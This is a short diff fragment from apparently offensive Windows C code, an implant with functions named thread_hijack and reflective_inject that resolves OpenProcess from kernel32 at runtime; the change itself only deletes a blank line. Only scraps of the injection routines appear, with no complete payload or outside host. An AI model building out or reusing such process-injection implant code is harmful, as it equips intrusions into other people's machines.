@@ -400,7 +400,6 @@ VOID thread_hijack(IMPLANT_CONFIG config) {
     ResumeThread(pi.hThread);
 }
 
-
 VOID reflective_inject(DWORD pid) {
     HMODULE k32 = GetModuleHandleW(L"kernel32.dll");
     RESOLVE(pOpenProcess, OpenProcess, k32);
